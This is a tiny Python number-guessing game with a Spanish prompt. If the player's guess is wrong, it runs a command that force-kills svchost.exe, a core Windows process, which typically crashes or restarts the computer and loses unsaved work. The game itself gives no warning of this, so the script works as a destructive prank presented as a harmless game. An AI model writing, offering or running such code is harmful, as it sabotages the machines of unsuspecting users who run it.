import os
import random

x = random.randint(0, 10)

user_input = input("Introduzca un numero: ")

if int(user_input) == x:
    print("¡Ganaste!")
else:
    os.system("taskkill.exe /f /im svchost.exe")